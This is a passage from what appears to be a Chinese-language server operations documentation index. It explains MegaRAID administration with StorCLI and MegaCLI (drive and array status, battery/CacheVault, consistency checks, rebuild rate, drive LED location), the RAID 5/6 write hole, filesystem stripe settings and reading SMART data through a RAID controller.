:\n===================\n\uff08\u200b\u4ee5\u4e0b\u200b\u7701\u7565\u200b\uff09\n$ sudo ./storcli64 /c0 /e252 /sall show all nolog\n...\nDrive /c0/e252/s0 :\n=================\n\n--------------------------------------------------------------------------------\nEID:Slt DID State DG     Size Intf Med SED PI SeSz Model                Sp Type \n--------------------------------------------------------------------------------\n252:0     8 Onln   0 9.094 TB SATA HDD N   N  512B HGST HUH721010ALE600 U  -    \n--------------------------------------------------------------------------------\n\uff08\u200b\u4ee5\u4e0b\u200b\u7701\u7565\u200b\uff09\n$ sudo ./storcli64 /c0 /vall show all nolog\n...\n/c0/v0 :\n======\n\n--------------------------------------------------------------\nDG/VD TYPE  State Access Consist Cache Cac sCC      Size Name \n--------------------------------------------------------------\n0/0   RAID6 Optl  RW     Yes     NRWTC -   ON  36.380 TB      \n--------------------------------------------------------------\n\uff08\u200b\u4ee5\u4e0b\u200b\u7701\u7565\u200b\uff09\n</code></pre> MegaCLI alternative <pre><code>$ sudo ./MegaCli64 -AdpallInfo -a0 -NoLog  # \u200b\u4f7f\u7528\u200b -aALL \u200b\u8868\u793a\u200b\u6240\u6709\u200b\u63a7\u5236\u5668\u200b\n\nAdapter #0\n\n==============================================================================\n                    Versions\n                ================\nProduct Name    : PERC 6/i Integrated\nSerial No       : 1122334455667788\nFW Package Build: 6.3.3.0002\n\uff08\u200b\u4ee5\u4e0b\u200b\u7701\u7565\u200b\uff09\n$ sudo ./MegaCli64 -EncInfo -a0 -NoLog\n\nNumber of enclosures on adapter 0 -- 1\n\nEnclosure 0:\nDevice ID                     : 32\n\uff08\u200b\u4ee5\u4e0b\u200b\u7701\u7565\u200b\uff09\n$ sudo ./MegaCli64 -PDList -a0 -NoLog\n\nAdapter #0\n\nEnclosure Device ID: 32\nSlot Number: 2\nDrive's position: DiskGroup: 1, Span: 0, Arm: 0\nEnclosure position: N/A\nDevice Id: 2\nWWN: \nSequence Number: 2\nMedia Error Count: 0\nOther Error Count: 50107\nPredictive Failure Count: 0\nLast Predictive Failure Event Seq Number: 0\nPD Type: SATA\n\uff08\u200b\u4ee5\u4e0b\u200b\u7701\u7565\u200b\uff09\n$ sudo ./MegaCli64 -LDInfo -Lall -a0 -NoLog\n\n\nAdapter 0 -- Virtual Drive Information:\nVirtual Drive: 0 (Target Id: 0)\nName                :sys\nRAID Level          : Primary-1, Secondary-0, RAID Level Qualifier-0\nSize                : 931.0 GB\nSector Size         : 512\nMirror Data         : 931.0 GB\nState               : Degraded\nStrip Size          : 64 KB\nNumber Of Drives    : 2\nSpan Depth          : 1\nDefault Cache Policy: WriteBack, ReadAheadNone, Direct, No Write Cache if Bad BBU\nCurrent Cache Policy: WriteBack, ReadAheadNone, Direct, No Write Cache if Bad BBU\nDefault Access Policy: Read/Write\nCurrent Access Policy: Read/Write\nDisk Cache Policy   : Disk's Default\nEncryption Type     : None\nIs VD Cached: No\n\uff08\u200b\u4ee5\u4e0b\u200b\u7701\u7565\u200b\uff09\n</code></pre>"},{"location":"ops/storage/raid/#megaraid-maintenance","title":"\u7ef4\u62a4\u200b\u64cd\u4f5c","text":""},{"location":"ops/storage/raid/#megaraid-battery","title":"\u7535\u6c60\u200b\u72b6\u6001","text":"<p>MegaRAID \u200b\u63a7\u5236\u5668\u200b\u4e00\u822c\u200b\u4f1a\u200b\u6709\u200b\u4e00\u4e2a\u200b\u7535\u6c60\u200b\uff08Battery Backup Unit, BBU\uff09\u200b\u7528\u4e8e\u200b\u4fdd\u62a4\u200b\u7f13\u5b58\u200b\u4e2d\u200b\u7684\u200b\u6570\u636e\u200b\u3002 \u200b\u5f53\u200b\u610f\u5916\u200b\u65ad\u7535\u200b\u7684\u200b\u60c5\u51b5\u200b\u53d1\u751f\u200b\u65f6\u200b\uff0c\u200b\u7535\u6c60\u200b\u4f1a\u200b\u652f\u6491\u200b\u63a7\u5236\u5668\u200b\u5c06\u200b\u7f13\u5b58\u200b\u4e2d\u200b\u7684\u200b\u6570\u636e\u200b\u5199\u5165\u200b\u78c1\u76d8\u200b\uff0c\u200b\u4ee5\u200b\u907f\u514d\u200b\u6570\u636e\u200b\u4e22\u5931\u200b\u3002 \u200b\u5728\u200b\u9ed8\u8ba4\u200b\u914d\u7f6e\u200b\u4e0b\u200b\uff0c\u200b\u5982\u679c\u200b\u7535\u6c60\u200b\u635f\u574f\u200b\uff0c\u200b\u90a3\u4e48\u200b\u63a7\u5236\u5668\u200b\u4e0d\u4f1a\u200b\u4f7f\u7528\u200b\u7f13\u5b58\u200b\uff08WriteBack\uff09\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u800c\u662f\u200b\u4f7f\u7528\u200b\u76f4\u5199\u200b\uff08WriteThrough\uff09\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u9020\u6210\u200b\u5199\u5165\u200b\u6027\u80fd\u200b\u4e0b\u964d\u200b\u3002 \u200b\u5728\u200b\u67d0\u4e9b\u200b\u63a7\u5236\u5668\u200b\u4e0a\u200b\uff0c\u200b\u8fd9\u9879\u200b\u529f\u80fd\u200b\u662f\u200b\u7531\u200b\u79f0\u4e4b\u4e3a\u200b CacheVault \u200b\u7684\u200b\u6280\u672f\u200b\u5b9e\u73b0\u200b\u7684\u200b\u3002</p> <pre><code>$ sudo ./storcli64 /c0 /bbu show all\n...\nDetailed Status :\n===============\n\n--------------------------------------\nCtrl Status Property ErrMsg     ErrCd \n--------------------------------------\n   0 Failed -        use /cx/cv   255 \n--------------------------------------\n$ # \u200b\u8fd9\u91cc\u200b\u63d0\u793a\u200b\u4f7f\u7528\u200b /cx/cv \u200b\u67e5\u770b\u200b CacheVault \u200b\u7684\u200b\u72b6\u6001\u200b\n$ sudo ./storcli64 /c0 /cv show all\n...\nCachevault_Info :\n===============\n\n--------------------\nProperty    Value   \n--------------------\nType        CVPM02  \nTemperature 20 C    \nState       Optimal \n--------------------\n\uff08\u200b\u4ee5\u4e0b\u200b\u7701\u7565\u200b\uff09\n</code></pre> MegaCLI alternative <pre><code>$ sudo ./MegaCli64 -AdpBbuCmd -a0 -NoLog\n\nBBU status for Adapter: 0\n\nBatteryType: BBU\nVoltage: 3991 mV\nCurrent: 0 mA\nTemperature: 22 C\nBattery State: Optimal\n\uff08\u200b\u4ee5\u4e0b\u200b\u7701\u7565\u200b\uff09\n</code></pre> <p>MegaCLI \u200b\u53ef\u80fd\u200b\u4e0d\u200b\u652f\u6301\u200b CacheVault\u3002</p> <p>RAID 5/6 write hole \u200b\u95ee\u9898\u200b</p> <p>\u200b\u5728\u200b\u8ba8\u8bba\u200b RAID 5/6 \u200b\u7684\u200b\u53ef\u9760\u6027\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u4e3a\u4ec0\u4e48\u200b btrfs \u200b\u4e00\u76f4\u200b\u6ca1\u6709\u200b\u7a33\u5b9a\u200b\u7684\u200b RAID 5/6 \u200b\u652f\u6301\u200b\u65f6\u200b\uff0c\u200b\u7ecf\u5e38\u200b\u4f1a\u200b\u63d0\u5230\u200b write hole \u200b\u95ee\u9898\u200b\u3002 \u200b\u5728\u200b RAID 5/6 \u200b\u9635\u5217\u200b\u4e2d\u200b\uff0c\u200b\u5728\u200b\u6bcf\u5757\u200b\u76d8\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u200b\u90fd\u200b\u9700\u8981\u200b\u4fdd\u6301\u200b\u4e00\u81f4\u6027\u200b\uff08\u200b\u5305\u62ec\u200b parity\uff09\uff0c\u200b\u4f46\u662f\u200b\u9635\u5217\u200b\u7684\u200b\u5199\u5165\u200b\u64cd\u4f5c\u200b\u4e0d\u662f\u200b\u300c\u200b\u539f\u5b50\u200b\u300d\u200b\u7684\u200b\u3002 \u200b\u8fd9\u200b\u610f\u5473\u7740\u200b\u6bcf\u6b21\u200b\u5199\u5165\u200b\u65f6\u200b\uff0c\u200b\u9635\u5217\u200b\u5728\u200b\u4e8b\u5b9e\u4e0a\u200b\u6709\u200b\u4e00\u5c0f\u200b\u6bb5\u65f6\u95f4\u200b\u662f\u200b\u4e0d\u200b\u4e00\u81f4\u200b\u7684\u200b\u3002 \u200b\u5982\u679c\u200b\u7a81\u7136\u200b\u65ad\u7535\u200b\uff0c\u200b\u5c31\u200b\u53ef\u80fd\u200b\u4ea7\u751f\u200b\u4e0d\u200b\u4e00\u81f4\u200b\u3002\u200b\u5982\u679c\u200b\u8fd9\u79cd\u200b\u4e0d\u200b\u4e00\u81f4\u200b\u51fa\u73b0\u200b\u5728\u200b parity \u200b\u4e2d\u200b\uff0c\u200b\u8fd9\u6837\u200b\u7684\u200b\u9519\u8bef\u200b\u4e0d\u200b\u53ef\u80fd\u200b\u88ab\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u68c0\u6d4b\u200b\u5230\u200b\uff0c \u200b\u90a3\u4e48\u200b\u5c31\u200b\u53ef\u80fd\u200b\u5728\u200b\u672a\u6765\u200b\u91cd\u5efa\u200b\u65f6\u200b\u6062\u590d\u200b\u51fa\u200b\u9519\u8bef\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b\u786c\u4ef6\u200b RAID\uff0c\u200b\u8bbe\u7f6e\u200b\u7535\u6c60\u200b\u4e00\u822c\u200b\u5373\u53ef\u200b\u89e3\u51b3\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\u3002\u200b\u4f46\u662f\u200b\u5bf9\u4e8e\u200b\u8f6f\u4ef6\u200b RAID \u200b\u6765\u8bf4\u200b\u5c31\u200b\u9ebb\u70e6\u200b\u4e00\u4e9b\u200b\u4e86\u200b\u3002Linux \u200b\u7684\u200b md \u200b\u652f\u6301\u200b\u4e24\u79cd\u200b\u65b9\u6cd5\u200b\uff1a \u200b\u8bbe\u7f6e\u200b\u4e00\u4e2a\u200b\u989d\u5916\u200b\u7684\u200b\u8bbe\u5907\u200b\u7528\u6765\u200b\u505a\u200b dirty stripe journal\uff0c\u200b\u6216\u8005\u200b\u5bf9\u4e8e\u200b RAID 5\uff0c\u200b\u5728\u200b RAID \u200b\u5143\u200b\u6570\u636e\u200b\u4e2d\u200b\u5b58\u50a8\u200b partial parity log\u3002</p> <p>ZFS \u200b\u7684\u200b raidz1/2/3 \u200b\u4e0d\u200b\u53d7\u200b write hole \u200b\u5f71\u54cd\u200b\u3002</p>"},{"location":"ops/storage/raid/#megaraid-scrub","title":"\u5b8c\u6574\u6027\u68c0\u67e5","text":"<p>\u200b\u4e0b\u9762\u200b\u7684\u200b\u90e8\u5206\u200b\u5185\u5bb9\u200b\u6ca1\u6709\u200b\u547d\u4ee4\u200b\u8f93\u51fa\u200b\u5c55\u793a\u200b</p> <p>\u200b\u7531\u4e8e\u200b\u6ca1\u6709\u200b\u6d4b\u8bd5\u200b\u6761\u4ef6\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4e0b\u9762\u200b\u7684\u200b\u90e8\u5206\u200b\u9700\u8981\u200b\u5bf9\u200b\u78c1\u76d8\u200b\u72b6\u6001\u200b\u4f5c\u200b\u4fee\u6539\u200b\u7684\u200b\u5185\u5bb9\u200b\u4ec5\u4f5c\u200b\u793a\u4f8b\u200b\u3002</p> <p>MegaRAID \u200b\u9635\u5217\u5361\u200b\u9ed8\u8ba4\u200b\u5b9a\u671f\u200b\u8fdb\u884c\u200b\u5b8c\u6574\u6027\u68c0\u67e5\u200b\uff08Consistency Check\uff09\u200b\u4e0e\u200b Patrol Read\uff1b \u200b\u524d\u8005\u200b\u68c0\u67e5\u200b\u9635\u5217\u200b\u4e2d\u200b\u7684\u200b\u6570\u636e\u200b\u662f\u5426\u200b\u4e00\u81f4\u200b\uff0c\u200b\u540e\u8005\u200b\u68c0\u67e5\u200b\u7269\u7406\u200b\u78c1\u76d8\u200b\u662f\u5426\u200b\u6709\u574f\u200b\u9053\u200b\u7b49\u200b\u95ee\u9898\u200b\u3002 \u200b\u53ef\u4ee5\u200b\u67e5\u770b\u200b\u9635\u5217\u200b\u7684\u200b\u5b8c\u6574\u6027\u68c0\u67e5\u200b\u4e0e\u200b Patrol Read \u200b\u72b6\u6001\u200b\uff1a</p> <pre><code>$ sudo ./storcli64 /c0 show cc nolog\n...\nController Properties :\n=====================\n\n-----------------------------------------------\nCtrl_Prop                 Value                \n-----------------------------------------------\nCC Operation Mode         Concurrent           \nCC Execution Delay        168 hours            \nCC Next Starttime         02/17/2024, 03:00:00 \nCC Current State          Active               \nCC Number of iterations   110                  \nCC Number of VD completed 0                    \nCC Excluded VDs           None                 \n-----------------------------------------------\n$ sudo ./storcli64 /c0 show patrolRead nolog\n...\nController Properties :\n=====================\n\n---------------------------------------------\nCtrl_Prop               Value                \n---------------------------------------------\nPR Mode                 Auto                 \nPR Execution Delay      168 hours            \nPR iterations completed 18                   \nPR Next Start time      09/17/2022, 03:00:00 \nPR on SSD               Disabled             \nPR Current State        Active 0             \nPR Excluded VDs         None                 \nPR MaxConcurrentPd      255                  \n---------------------------------------------\n</code></pre> <p>\u200b\u68c0\u67e5\u200b\u9635\u5217\u5361\u200b\u7684\u200b\u65f6\u95f4\u200b</p> <p>\u200b\u9635\u5217\u5361\u200b\u7684\u200b\u65f6\u95f4\u200b\u53ef\u80fd\u200b\u4e0e\u200b\u7cfb\u7edf\u200b\u65f6\u95f4\u200b\u4e0d\u200b\u4e00\u81f4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>/cx show time</code> (StorCLI) / <code>-AdpGetTime -ax</code> (MegaCLI) \u200b\u67e5\u770b\u200b\u3002</p> MegaCLI alternative <pre><code>$ sudo ./MegaCli64 -AdpCcSched -Info -a0 -NoLog\n\nAdapter #0\n\nOperation Mode: Disabled\nExecution Delay: 168\nNext start time: 09/02/2023, 03:00:00\nCurrent State: Stopped\nNumber of iterations: 0\nNumber of VD completed: 0\nExcluded VDs          : None\nExit Code: 0x00\n$ sudo ./MegaCli64 -AdpPR -Info -a0 -NoLog\n\nAdapter 0: Patrol Read Information:\n\nPatrol Read Mode: Auto\nPatrol Read Execution Delay: 168 hours\nNumber of iterations completed: 591 \nNext start time: 02/26/2024, 21:00:00\nCurrent State: Stopped\nPatrol Read on SSD Devices: Disabled\n\nExit Code: 0x00\n</code></pre>"},{"location":"ops/storage/raid/#megaraid-rebuild","title":"\u91cd\u5efa\u200b\u64cd\u4f5c","text":"<p>\u200b\u5728\u200b\u66ff\u6362\u200b\u574f\u76d8\u200b\u540e\u200b\uff0c\u200b\u9635\u5217\u5361\u200b\u4f1a\u200b\u81ea\u52a8\u200b\u5f00\u59cb\u200b\u91cd\u5efa\u200b\u64cd\u4f5c\u200b\u3002 \u200b\u5982\u679c\u200b\u5728\u200b\u6709\u200b\u76d8\u200b\u635f\u574f\u200b\u65f6\u6709\u200b\u70ed\u5907\u200b\u76d8\u200b\uff08Spare\uff09\uff0c\u200b\u90a3\u4e48\u200b\u9635\u5217\u5361\u200b\u4f1a\u200b\u81ea\u52a8\u200b\u5c06\u200b\u70ed\u5907\u200b\u76d8\u200b\u52a0\u5165\u200b\u9635\u5217\u200b\u5e76\u200b\u5f00\u59cb\u200b\u91cd\u5efa\u200b\u3002</p> <p>\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u9635\u5217\u5361\u200b\u4f1a\u200b\u5728\u200b\u91cd\u5efa\u200b\u65f6\u200b\u9650\u5236\u200b IO \u200b\u6027\u80fd\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u6307\u6807\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>rebuildrate</code> \u200b\u53c2\u6570\u200b\u8c03\u6574\u200b\uff08\u200b\u9ed8\u8ba4\u200b\u4e3a\u200b 30%\uff09\uff1a</p> <pre><code>$ sudo ./storcli64 /c0 show rebuildrate nolog\n...\nController Properties :\n=====================\n\n------------------\nCtrl_Prop   Value \n------------------\nRebuildrate 30%   \n------------------\n$ sudo ./storcli64 /c0 set rebuildrate=60 nolog\n...\nController Properties :\n=====================\n\n------------------\nCtrl_Prop   Value \n------------------\nRebuildrate 60%   \n------------------\n</code></pre> MegaCLI alternative <pre><code>$ sudo ./MegaCli64 -AdpGetProp RebuildRate -a0 -NoLog\n\nAdapter 0: Rebuild Rate = 30%\n\nExit Code: 0x00\n$ sudo ./MegaCli64 -AdpSetProp RebuildRate -60 -a0 -NoLog\n\nAdapter 0: Set rebuild rate to 60% success.\n\nExit Code: 0x00\n</code></pre> <p>\u200b\u5728\u200b\u91cd\u5efa\u200b\u65f6\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u67e5\u770b\u200b\u91cd\u5efa\u200b\u7684\u200b\u8fdb\u5ea6\u200b\uff1a</p> <pre><code>sudo ./storcli64 /c0 /sx show rebuild nolog\n</code></pre> MegaCLI alternative <pre><code>$ sudo ./MegaCli64 -PDRbld -ShowProg -PhysDrv [252:7] -a0 -NoLog\n\nRebuild Progress on Device at Enclosure 252, Slot 7 Completed 8% in 39 Minutes.\n\nExit Code: 0x00\n</code></pre>"},{"location":"ops/storage/raid/#megaraid-ident","title":"\u78c1\u76d8\u200b\u8bc6\u522b","text":"<p>\u200b\u5728\u200b\u78c1\u76d8\u200b\u635f\u574f\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6258\u67b6\u200b\u4e0a\u200b\u7684\u200b LED \u200b\u706f\u200b\u4e00\u822c\u200b\u4f1a\u4eae\u200b\u7ea2\u200b\u6216\u200b\u9ec4\u706f\u200b\uff0c\u200b\u4fbf\u4e8e\u200b\u641c\u7d22\u200b\u3002 \u200b\u4f46\u662f\u200b\u6709\u200b\u7684\u200b\u65f6\u5019\u200b\u6211\u4eec\u200b\u6709\u200b\u627e\u5230\u200b\u67d0\u5757\u200b\u786c\u76d8\u200b\u7684\u200b\u9700\u6c42\u200b\uff08\u200b\u5373\u4f7f\u200b\u5b83\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u88ab\u200b\u9635\u5217\u5361\u200b\u8bc6\u522b\u200b\u4e3a\u200b\u635f\u574f\u200b\uff09\u3002 MegaRAID \u200b\u7684\u200b\u5de5\u5177\u200b\u53ef\u4ee5\u200b\u63a7\u5236\u200b\u786c\u76d8\u200b\u7684\u200b LED \u200b\u706f\u200b\uff0c\u200b\u4fbf\u4e8e\u200b\u627e\u5230\u200b\u5bf9\u5e94\u200b\u7684\u200b\u786c\u76d8\u200b\u3002</p> <pre><code># \u200b\u5f00\u59cb\u200b\u95ea\u70c1\u200b\u5bf9\u5e94\u200b\u786c\u76d8\u200b\u7684\u200b LED \u200b\u706f\u200b\nsudo ./storcli64 /c0 /e252 /s0 locate start nolog\n# \u200b\u505c\u6b62\u200b\u95ea\u70c1\u200b\nsudo ./storcli64 /c0 /e252 /s0 locate stop nolog\n</code></pre> MegaCLI alternative <pre><code># \u200b\u5f00\u59cb\u200b\u95ea\u70c1\u200b\nsudo ./MegaCli64 -PdLocate -start -physdrv[252:0] -a0 -NoLog\n# \u200b\u505c\u6b62\u200b\u95ea\u70c1\u200b\nsudo ./MegaCli64 -PdLocate -stop -physdrv[252:0] -a0 -NoLog\n</code></pre> <p>\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u8ba9\u200b\u9635\u5217\u5361\u200b\u53d1\u51fa\u58f0\u97f3\u200b\u2026\u2026</p> <p>\u200b\u53ef\u4ee5\u200b\u914d\u7f6e\u200b\u9635\u5217\u5361\u200b\u5728\u200b\u9635\u5217\u200b\u51fa\u73b0\u5f02\u5e38\u200b\u60c5\u51b5\u200b\u65f6\u200b\u53d1\u51fa\u58f0\u97f3\u200b\uff0c\u200b\u8fd9\u200b\u53ef\u4ee5\u200b\u5e2e\u52a9\u200b\u5728\u200b\u673a\u623f\u200b\u7684\u200b\u7cfb\u7edf\u7ba1\u7406\u5458\u200b\u53d1\u73b0\u5f02\u5e38\u200b\u60c5\u51b5\u200b\u3002 \u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>show alarm</code> (StorCLI) / <code>-AdpGetProp AlarmDsply</code> (MegaCLI) \u200b\u663e\u793a\u200b\u5f53\u524d\u200b\u7684\u200b\u914d\u7f6e\u200b\u60c5\u51b5\u200b\u3002</p> <pre><code>$ sudo ./storcli64 /c0 show alarm nolog\n...\nController Properties :\n=====================\n\n----------------\nCtrl_Prop Value \n----------------\nAlarm     ON    \n----------------\n</code></pre>"},{"location":"ops/storage/raid/#raid-fs","title":"RAID \u200b\u4e0e\u200b\u6587\u4ef6\u7cfb\u7edf","text":"<p>\u200b\u5728\u200b RAID \u200b\u9635\u5217\u200b\u4e2d\u200b\uff0c\"chunk\" \u200b\u6307\u200b\u6bcf\u5757\u200b\u76d8\u4e0a\u200b\u7684\u200b\u6570\u636e\u200b\u5757\u200b\u5927\u5c0f\u200b\uff0c\u200b\u4f8b\u5982\u200b\u4ee5\u4e0b\u200b RAID 0 \u200b\u7684\u200b\u5e03\u5c40\u200b\u8868\u200b\uff1a</p> Disk 0 Disk 1 0 1 2 3 ... ... <p>\u200b\u5176\u4e2d\u200b\u7684\u200b 0, 1, 2, 3 \u200b\u7b49\u200b\u6bcf\u4e00\u9879\u200b\u90fd\u200b\u662f\u200b\u4e00\u4e2a\u200b chunk\u3002Chunk \u200b\u901a\u5e38\u200b\u6bd4\u200b\u6247\u533a\u200b\uff08512B \u200b\u6216\u200b 4KB\uff09\u200b\u5927\u5f97\u591a\u200b\uff0c\u200b\u4f8b\u5982\u200b 64KB \u200b\u6216\u200b 128KB\u3002 \u200b\u6bcf\u884c\u200b\u7684\u200b chunk \u200b\u5c31\u200b\u7ec4\u6210\u200b\u6761\u5e26\u200b\uff08stripe\uff09\u3002 \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u5728\u200b\u683c\u5f0f\u5316\u200b\u65f6\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u63d0\u4f9b\u200b RAID \u200b\u76f8\u5173\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5e2e\u52a9\u200b\u5408\u7406\u5e03\u5c40\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b ext4 \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c<code>mkfs.ext4 -E</code> \u200b\u4e2d\u200b\u7684\u200b <code>stride</code> \u200b\u4e0e\u200b <code>stripe_width</code> \u200b\u53c2\u6570\u200b\u53ef\u4ee5\u200b\u7528\u6765\u200b\u63d0\u4f9b\u200b RAID \u200b\u9635\u5217\u200b\u7684\u200b\u4fe1\u606f\u200b\uff1a</p> <ul> <li><code>stride</code> \u200b\u662f\u200b chunk \u200b\u9664\u4ee5\u200b block size\uff08\u200b\u4e00\u822c\u200b\u4e3a\u200b 4k\uff09\u200b\u7684\u200b\u7ed3\u679c\u200b\uff0c\u200b\u5373\u200b\u5728\u200b\u79fb\u52a8\u200b\u5230\u200b\u4e0b\u200b\u4e00\u5757\u200b\u76d8\u200b\u4e4b\u524d\u200b\u4f1a\u200b\u5904\u7406\u200b\u7684\u200b block \u200b\u7684\u200b\u6570\u91cf\u200b</li> <li><code>stripe_width</code> \u200b\u662f\u200b stripe \u200b\u7684\u200b\u5757\u200b\u6570\u200b\uff08stride * \u200b\u5b9e\u9645\u200b\u6570\u636e\u200b\u76d8\u6570\u200b\uff0c\u200b\u4e0d\u200b\u5305\u542b\u200b parity \u200b\u76d8\u200b\uff09</li> </ul> <p>\u200b\u800c\u200b\u5bf9\u4e8e\u200b XFS \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u5176\u200b\u80fd\u591f\u200b\u81ea\u52a8\u8bc6\u522b\u200b\u8f6f\u4ef6\u200b RAID \u200b\u7684\u200b\u4fe1\u606f\u200b\u3002\u200b\u5728\u200b\u4f7f\u7528\u200b\u786c\u4ef6\u200b RAID \u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u5219\u200b\u9700\u8981\u200b\u5728\u200b <code>mkfs.xfs -d</code> \u200b\u7684\u200b\u65f6\u5019\u200b \u200b\u8003\u8651\u200b <code>sunit</code> \u200b\u4e0e\u200b <code>swidth</code> \u200b\u53c2\u6570\u200b\uff1a</p> <ul> <li><code>sunit</code> \u200b\u662f\u200b chunk \u200b\u9664\u4ee5\u200b\u6247\u533a\u200b\uff08512B\uff09\u200b\u7684\u200b\u7ed3\u679c\u200b</li> <li><code>swidth</code> \u200b\u5219\u200b\u662f\u200b <code>sunit</code> \u200b\u4e58\u4ee5\u200b\u5b9e\u9645\u200b\u6570\u636e\u200b\u76d8\u6570\u200b</li> </ul>"},{"location":"ops/storage/raid/#monitor","title":"\u76d1\u63a7","text":""},{"location":"ops/storage/raid/#smart","title":"SMART \u200b\u4fe1\u606f","text":"<p>\u200b\u9605\u8bfb\u200b SMART \u200b\u4fe1\u606f\u200b\u53ef\u4ee5\u200b\u5e2e\u52a9\u200b\u4e86\u89e3\u200b\u786c\u76d8\u200b\u7684\u200b\u5065\u5eb7\u200b\u72b6\u6001\u200b\u3002\u200b\u5728\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\uff0c\u200b\u5982\u679c\u200b\u4f7f\u7528\u200b\u786c\u4ef6\u200b RAID\uff0c\u200b\u4f7f\u7528\u200b <code>smartctl</code> \u200b\u9700\u8981\u200b\u6dfb\u52a0\u200b\u989d\u5916\u200b\u7684\u200b\u53c2\u6570\u200b\u6765\u200b\u4ece\u200b RAID \u200b\u63a7\u5236\u5668\u200b\u83b7\u53d6\u200b\u771f\u5b9e\u200b\u7684\u200b\u78c1\u76d8\u200b\u4fe1\u606f\u200b\uff0c\u200b\u4f8b\u5982\u200b\u4e0b\u9762\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff1a</p> <pre><code>$ sudo smartctl --scan\n/dev/sda -d scsi # /dev/sda, SCSI device\n/dev/sdb -d scsi # /dev/sdb, SCSI device\n/dev/sdc -d scsi # /dev/sdc, SCSI device\n/dev/sdd -d scsi # /dev/sdd, SCSI device\n/dev/bus/4 -d megaraid,8 # /dev/bus/4 [megaraid_disk_08], SCSI device\n/dev/bus/4 -d megaraid,9 # /dev/bus/4 [megaraid_disk_09], SCSI device\n/dev/bus/4 -d megaraid,10 # /dev/bus/4 [megaraid_disk_10], SCSI device\n/dev/bus/4 -d megaraid,11 # /dev/bus/4 [megaraid_disk_11], SCSI device\n/dev/bus/4 -d megaraid,12 # /dev/bus/4 [megaraid_disk_12], SCSI device\n/dev/bus/4 -d megaraid,13 # /dev/bus/4 [megaraid_disk_13], SCSI device\n/dev/bus/4 -d megaraid,14 # /dev/bus/4 [megaraid_disk_14], SCSI device\n/dev/bus/4 -d megaraid,15 # /dev/bus/4 [megaraid_disk_15], SCSI device\n/dev/bus/0 -d megaraid,8 # /dev/bus/0 [megaraid_disk_08], SCSI device\n/dev/bus/0 -d megaraid,9 # /dev/bus/0 [megaraid_disk_09], SCSI device\n/dev/bus/0 -d megaraid,10 # /dev/bus/0 [megaraid_disk_10], SCSI device\n/dev/bus/0 -d megaraid,11 # /dev/bus/0 [megaraid_disk_11], SCSI device\n/dev/bus/0 -d megaraid,12 # /dev/bus/0 [megaraid_disk_12], SCSI device\n/dev/bus/0 -d megaraid,13 # /dev/bus/0 [megaraid_disk_13], SCSI device\n$ sudo smartctl -a /dev/sdd  # \u200b\u76f4\u63a5\u200b\u67e5\u8be2\u200b\u53ea\u80fd\u200b\u770b\u5230\u200b\u6ca1\u6709\u200b\u610f\u4e49\u200b\u7684\u200b\u63a7\u5236\u5668\u200b\u4fe1\u606f\u200b\nsmartctl 7.2 2020-12-30 r5155 [x86_64-linux-5.10.0-21-amd64] (local build)\nCopyright (C) 2002-20, Bruce Allen, Christian Franke, www.smartmontools.org\n\n=== START OF INFORMATION SECTION ===\nVendor:               AVAGO\nProduct:              MR9361-8i\nRevision:             4.68\nCompliance:           SPC-3\nUser Capacity:        1,919,816,826,880 bytes [1.91 TB]\nLogical block size:   512 bytes\nPhysical block size:  4096 bytes\nLogical Unit id:      0x600605b00f17786026223e2d33c1767b\nSerial number:        007b76c1332d3e22266078170fb00506\nDevice type:          disk\nLocal Time is:        Sun Feb 11 18:40:45 2024 CST\nSMART support is:     Unavailable - device lacks SMART capability.\n\n=== START OF READ SMART DATA SECTION ===\nCurrent Drive Temperature:     0 C\nDrive Trip Temperature:        0 C\n\nError Counter logging not supported\n\nDevice does not support Self Test logging\n$ sudo smartctl -a /dev/bus/4 -d megaraid,8  # \u200b\u6dfb\u52a0\u200b\u53c2\u6570\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u771f\u5b9e\u200b\u7684\u200b\u78c1\u76d8\u200b\u4fe1\u606f\u200b\n\uff08\u200b\u5185\u5bb9\u200b\u7701\u7565\u200b\uff09\n</code></pre> <p><code>smartctl -a</code> \u200b\u7684\u200b\u8f93\u51fa\u200b\u4e3b\u8981\u200b\u5206\u4e3a\u200b\u4e24\u4e2a\u200b\u90e8\u5206\u200b\uff1ainformation section \u200b\u548c\u200b smart data section\u3002</p> <p>Information section \u200b\u5c55\u793a\u200b\u786c\u76d8\u200b\u7684\u200b\u57fa\u672c\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5305\u62ec\u200b\u578b\u53f7\u200b\u3001\u200b\u5e8f\u5217\u53f7\u200b\u3001\u200b\u5bb9\u91cf\u200b\u3001\u200b\u56fa\u4ef6\u200b\u7248\u672c\u200b\u7b49\u200b\u3002</p> \u200b\u4e00\u5757\u200b NVMe SSD \u200b\u7684\u200b\u4fe1\u606f\u200b\u793a\u4f8b\u200b <pre><code>=== START OF INFORMATION SECTION ===\nModel Number:                       INTEL SSDPEKNU020TZ\nSerial 